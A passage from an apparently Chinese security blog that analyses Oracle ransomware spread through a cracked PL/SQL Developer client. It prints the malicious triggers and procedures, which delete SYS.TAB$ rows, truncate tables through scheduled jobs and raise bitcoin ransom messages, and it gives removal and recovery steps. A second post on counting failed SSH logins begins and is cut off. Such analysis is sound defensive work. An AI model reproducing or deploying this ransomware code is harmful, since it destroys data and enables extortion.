&quot;DBMS_SYSTEM_INTERNAL         &quot;</span><br><span class="line">  AFTER LOGON ON DATABASE</span><br><span class="line">BEGIN</span><br><span class="line"> &quot;DBMS_SYSTEM_INTERNAL         &quot;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">create or replace procedure DBMS_STANDARD_FUN9 wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">69 9a</span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">create or replace procedure &quot;DBMS_CORE_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">73c 4c4</span><br><span class="line"></span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE TRIGGER &quot;DBMS_CORE_INTERNAL         &quot;</span><br><span class="line">  AFTER LOGON ON SCHEMA</span><br><span class="line">BEGIN </span><br><span class="line">  &quot;DBMS_CORE_INTERNAL         &quot;;</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>该文件就是PLSQL客户端的sql文件，文件名为AfterConnect.sql，这个文件官方的软件包中为空（无内容），被篡改过的客户端中包含了连接数据库的恶意代码。</p><p>数据库启动后执行触发器<code>DBMS_SUPPORT_INTERNAL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_SUPPORT_INTERNAL         &quot; IS  </span><br><span class="line">DATE1 INT :=10;</span><br><span class="line">E1 EXCEPTION;</span><br><span class="line"> PRAGMA EXCEPTION_INIT(E1, -20312);</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-CREATED ),0) INTO DATE1 FROM V$DATABASE;</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">   EXECUTE IMMEDIATE &apos;create table ORACHK&apos;||SUBSTR(SYS_GUID,10)||&apos; tablespace system  as select * from sys.tab$&apos;;</span><br><span class="line">   DELETE SYS.TAB$ WHERE DATAOBJ# IN (SELECT DATAOBJ# FROM SYS.OBJ$ WHERE OWNER# NOT IN (0,38)) ;</span><br><span class="line">   COMMIT;</span><br><span class="line">   </span><br><span class="line">............省略.................</span><br><span class="line"></span><br><span class="line">   FOR I IN 1..2046 LOOP</span><br><span class="line">   DBMS_SYSTEM.KSDWRT(2, &apos;Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">   DBMS_SYSTEM.KSDWRT(2, &apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 &apos;);</span><br><span class="line">   END LOOP;</span><br><span class="line">   RAISE E1;</span><br><span class="line">   END IF;</span><br><span class="line">   EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20312,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    NULL;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p><strong>该文件的作用</strong></p><ul><li>当数据库文件创建大于1200天，就开始备份<code>TAB$表</code>。</li><li>删除<code>TAB$</code>中除<code>OWNER#</code>为(0,,38)的记录。</li><li>通过<code>SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION</code>清除备份信息。</li><li>然后通过<code>DBMS_SYSTEM.KSDWRT</code>在你的alert日志中写入2046次提示信息。</li><li>在抛出一个前台类似的信息。</li></ul><p><strong>数据库登录触发器<code>DBMS_SYSTEM_INTERNAL</code> </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_SYSTEM_INTERNAL         &quot; IS</span><br><span class="line">  DATE1 INT :=10;</span><br><span class="line">  E1 EXCEPTION;</span><br><span class="line">  PRAGMA EXCEPTION_INIT(E1, -20313);</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;);</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">    IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;)</span><br><span class="line">     THEN</span><br><span class="line">      RAISE E1;</span><br><span class="line">    END IF;</span><br><span class="line">    END IF;</span><br><span class="line">EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20313,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    NULL;</span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">............省略.................</span><br></pre></td></tr></table></figure><blockquote><p>该文件的作用</p></blockquote><ul><li>当你的非<code>SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;</code>之外的所有表的最小统计时间为1200天，并且非<code>C89239.EXE</code>程序,将对数据库进行锁定，提示<code>你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.</code>。</li></ul><p><strong>数据库触发器<code>DBMS_CORE_INTERNAL</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_CORE_INTERNAL         &quot; IS</span><br><span class="line">  V_JOB   NUMBER;</span><br><span class="line">  DATE1 INT :=10;</span><br><span class="line">  STAT VARCHAR2(2000);</span><br><span class="line">  V_MODULE VARCHAR2(2000);</span><br><span class="line">  E1 EXCEPTION;</span><br><span class="line">  PRAGMA EXCEPTION_INIT(E1, -20315);</span><br><span class="line">  CURSOR TLIST IS SELECT * FROM USER_TABLES WHERE TABLE_NAME NOT LIKE &apos;%$%&apos; AND TABLE_NAME NOT LIKE &apos;%ORACHK%&apos; AND CLUSTER_NAME IS NULL;</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;);</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">    FOR I IN TLIST LOOP</span><br><span class="line">    DBMS_OUTPUT.PUT_LINE(&apos;table_name is &apos; ||I.TABLE_NAME);</span><br><span class="line">    STAT:=&apos;truncate table &apos;||USER||&apos;.&apos;||I.TABLE_NAME;</span><br><span class="line">    DBMS_JOB.SUBMIT(V_JOB, &apos;DBMS_STANDARD_FUN9(&apos;&apos;&apos; || STAT || &apos;&apos;&apos;);&apos;, SYSDATE);</span><br><span class="line">    COMMIT;</span><br><span class="line">    END LOOP;</span><br><span class="line">    END IF; </span><br><span class="line">        IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;)</span><br><span class="line">     THEN</span><br><span class="line">      RAISE E1;</span><br><span class="line">    END IF;</span><br><span class="line"></span><br><span class="line">EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);    </span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">............省略.................</span><br></pre></td></tr></table></figure><p>该文件的作用</p><ul><li>将表明不含<code>$</code>、不含<code>ORACHK</code>的表放到一个游标里面，当你的非<code>SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;</code>之外的所有表的最小统计时间为1200天就执行执行<code>truncate table</code>操作，并且登录程序非<code>C89239.EXE</code>程序,则报出异常。</li></ul><h2 id="勒索病毒如何感染数据库？"><a href="#勒索病毒如何感染数据库？" class="headerlink" title="勒索病毒如何感染数据库？"></a>勒索病毒如何感染数据库？</h2><blockquote><p>根据勒索病毒特性，进一步分析，由于运维人员使用绿色版<code>PLSQL Developer 11.06中文绿色注册版(免Oracle11g客户端)</code>，然后连接数据库，导致数据库内被自动注入存储过程、触发器以及几千万个JOBS。</p></blockquote><blockquote><p>大家都清楚，绿色版的软件也称作破解软件，破解人员对官方软件进行修改之后重新发布的，如果你没有用正版软件的习惯，习惯下载破解软件，而不验证软件有无恶意，很容易中招。在这里也提醒大家，尽量使用正版软件，验证来源软件的签名，特别是在连接客户的真实环境的情况下，接触重要数据的情况下。</p></blockquote><h2 id="如何对数据进行恢复"><a href="#如何对数据进行恢复" class="headerlink" title="如何对数据进行恢复"></a>如何对数据进行恢复</h2><blockquote><p>客户发现的及时，并未对生成库造成锁定的影响，这时我们还是可以恢复的，通过清除勒索软件产生的垃圾数据，并通过备份进行数据还原，可以及时对数据进行恢复。（建议先在测试环境中，先进行测试，测试环境成功之后，再在生产系统中操作。）</p></blockquote><p>1、<code>alter system set job_queue_process=0 scope=both ;</code>并重启<code>db</code>。重启是由于此时数据库存在大量的<code>library cache lock</code>，无法操作。</p><p>2、删除上述的存储过程和触发器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drop trigger xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;</span><br><span class="line">drop trigger xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;</span><br><span class="line">drop trigger xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;</span><br><span class="line"> </span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;</span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;</span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;</span><br></pre></td></tr></table></figure><p><strong>注意后面的九个空格(x为空格)（<code>DBMS_SYSTEM_INTERNALxxxxxxxxx</code>）</strong></p><p>3、删除黑客创建的大量jobs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &apos;exec dbms_ijob.remove(&apos;||job||&apos;);&apos; </span><br><span class="line">from xxx </span><br><span class="line">where schema_user=&apos;xxx&apos; and what like &apos;%truncate%&apos;;</span><br></pre></td></tr></table></figure><p>4、确认被truncate的表，确认数据是否丢失。</p><p>5、如果测试环境测试正常，可以对生成数据库进行同样的操作。</p><h2 id="残余风险"><a href="#残余风险" class="headerlink" title="残余风险"></a>残余风险</h2><ul><li>删除job记录可能导致某些数据不能读取或丢失。</li><li>不能完全确认是否还有运维开发人员在使用带有勒索病毒的PLSQL Developer客户端。</li><li>数据库管理权限不分明，DDL操作审核不严格。</li></ul><h2 id="安全建设建议"><a href="#安全建设建议" class="headerlink" title="安全建设建议"></a>安全建设建议</h2><ul><li>在业务恢复之后，对关键资产、代码进行安全检查，扫描非法程序、高风险操作代码，及时排除残留风险。</li><li>在日常的运维管理中，通过制度和运维管理平台对运维管理人员的操作进行记录并审计，使用客户提供的终端和工具对数据库进行操作。</li><li>管理数据库的运维管理工具应从官方的渠道下载，在使用前需要对管理工具进行检测，禁止使用盗版工具对数据库进行操作。</li><li>建议建立健全关键资产管控，敏感资产管控，高风险操作管控，特权用户操作管控，同时对运维人员的DDL审核，并对可以创建触发器、存储过程的行为进行审核及管控，防止非法程序侵入。</li><li>建议建立健全灾备系统，相关备份策略、恢复测试流程、恢复测试案例。</li><li>定期进行容灾演练、场景演练、恢复测试、入侵用例恢复测试，尽可能缩短恢复时间</li></ul><p><strong><code>参考：</code></strong></p><p><a href="http://www.killdb.com/2017/02/12/%E6%AF%94%E7%89%B9%E5%B8%81%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B%E9%87%8D%E7%8E%B0%E6%B1%9F%E6%B9%96.html" target="_blank" rel="noopener">比特币攻击案例重现江湖</a></p><p><a href="http://www.xifenfei.com/2016/11/plsql-dev-hacker-bitcoin.html" target="_blank" rel="noopener">plsql dev引起的数据库被黑勒索比特币实现原理分析和解决方案</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1519886469360.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://airs-sec.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="勒索软件" scheme="http://airs-sec.com/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>从linux服务器的日志文件中提取有用信息</title>
    <link href="http://airs-sec.com/2018/01/30/%E4%BB%8Elinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF/"/>
    <id>http://airs-sec.com/2018/01/30/从linux服务器的日志文件中提取有用信息/</id>
    <published>2018-01-30T03:56:34.000Z</published>
    <updated>2018-01-30T04:46:17.651Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/wallhaven-442708.jpg" alt="enter description here" title="wallhaven-442708"></p><a id="more"></a><hr><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a><strong>第一部分</strong></h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>系统管理员每天忙绿于工作当中，当系统出现问题时，需要解决和回答各种各样的问题。经常被问到的题目是：某某设备执行某某命令的次数。这些信息通常不是直接存储的，大多数linux服务器灭有计数器或者专门的统计页面。但是，linux有日志文件，每次请求网页、发送电子邮件或登录操作系统的事件都会记录在日志文件中。对于任何系统管理员来说，一项基本的技能就是能够通过日志文件解析并提取有用的信息。</p><p>下面将引导你从日志文件中提取有用的信息，对信息进行排序和计数，最后构建一个bash循环，更方便的去执行批量化脚本。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>统计未经授权的SSH登录尝试失败/成功的次数。</p></blockquote><h2 id="0x01-目标文件"><a href="#0x01-目标文件" class="headerlink" title="0x01 目标文件"></a>0x01 目标文件</h2><ul><li>解析记录SSH连接尝试的日志文件，确定所有登录失败的行</li><li>使用gerp、awk、cut提取尝试登录的ip并记录到文件中</li><li>最后，获取登录的ip地</li></ul><h3 id="获取日志文件"><a href="#获取日志文件" class="headerlink" title="获取日志文件"></a>获取日志文件</h3><blockquote><p>不同的发行版的SSH记录到不同的文件当中</p></blockquote><ul><li>Ubuntu/Debian:/var/log/auth.log</li><li>Redhat:/var/log/secure</li></ul><blockquote><p>这里使用的操作系统为centos</p></blockquote><h3 id="获取ip"><a href="#获取ip" class="headerlink" title="获取ip"></a>获取ip</h3><p>通过管道符进行过滤。</p><p>1）从日志文件中筛选出我们的行</p><p>/var/log/secure日志文件包含大量的信息。这是因为所有的身份验证事件都与CRON事件和其他信息都一起写入该文件。另外，每个SSH登录事件写入多行并且有多种类型的SSH登录尝试需要考虑。</p><blockquote><p>两种不同类型的登录失败的SSH记录事件。</p></blockquote><p>1、无效用户，服务器上不存在的用户<br>2、有效用户，服务器上存在的用户但密码不正确</p><p>第一种类型的登录记录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: input_userauth_request: invalid user guest [preauth]</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.201.224.218</span><br><span class="line">Aug 23 03:47:15 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:16 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:17 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:18 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:20 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:24 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:25 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:26 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:27 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:27 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:29 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:29 centos7 sshd[3283]: Disconnecting: Too many authentication failures for guest [preauth]</span><br></pre></td></tr></table></figure><p>这里显示的是，ip：193.281.224.219以用户guest启动ssh连接，ssh记录这个用户是无效的，即在服务器上不存在，然而，193.281.224.219直接尝试密码登录，直到达到最大的尝试登录次数，ssh并终止连接。</p><p>从上面的记录中发现提取的日志还是比较多，我们需要精简输出，需要找出一行有特色的一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218</span><br></pre></td></tr></table></figure><blockquote><p>开始过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Invalid user&quot; /var/log/secure</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>输出如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:52:40 centos7 sshd[5160]: Invalid user acc from 193.201.224.218</span><br><span class="line">Aug 23 03:52:45 centos7 sshd[5243]: Invalid user adam from 193.201.224.218</span><br><span class="line">Aug 23 03:52:53 centos7 sshd[5312]: Invalid user adfexc from 193.201.224.218</span><br><span class="line">Aug 23 03:53:45 centos7 sshd[5494]: Invalid user admin2 from 193.201.224.218</span><br><span class="line">etc</span><br></pre></td></tr></table></figure><p>上述，正是我们需要的，每一行只针对每一个不同用户的登录尝试信息，包含了攻击者的ip并且不显示其他的任何行。</p><p>下面过滤出第二种类型的日志记录，使用了有效的用户名，但密码错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:08 centos7 sshd[5185]: reverse mapping checking getaddrinfo for 123.30.65.218.broad.xy.jx.dynamic.163data.com.cn [218.65.30.123] failed - POSSIBLE BREAK-IN ATTEMPT!</span><br><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:10 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:11 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:13 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:14 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:16 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:16 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:18 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:19 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:21 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:22 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user &quot;root&quot;</span><br><span class="line">Aug 23 05:08:24 centos7 sshd[5185]: Failed password for root from 218.65.30.123 port 42034 ssh2</span><br><span class="line">Aug 23 05:08:24 centos7 sshd[5185]: Disconnecting: Too many authentication failures for root [preauth]</span><br></pre></td></tr></table></figure></p><p>再次，找出不同用户连接出现一次的记录，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br></pre></td></tr></table></figure></p><blockquote><p>使用grep进行过滤。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pam_unix(sshd:auth): authentication failure&quot; secure</span><br></pre></td></tr></table></figure><blockquote><p>产生以下输出：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:04:56 centos7 sshd[5153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:05:18 centos7 sshd[5160]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:05:42 centos7 sshd[5164]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:06:06 centos7 sshd[5168]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">etc</span><br></pre></td></tr></table></figure><p>这正是我们需要的输出，我们可以在以上的输出情况下，过滤出ip地址。</p><p>2）、从一行文本中提取文本字符串</p><p>工具：cut、awk</p><p>awk是一个非常复杂的命令，但大多数管理员只能按以下方式来使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;&#123;print $N&#125;&apos;</span><br></pre></td></tr></table></figure><p>其中$N是从左到右空格所分割字符串的数量，在我们的日志行中，ip地址是文本字符串编号的10，awk命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;&#123;print 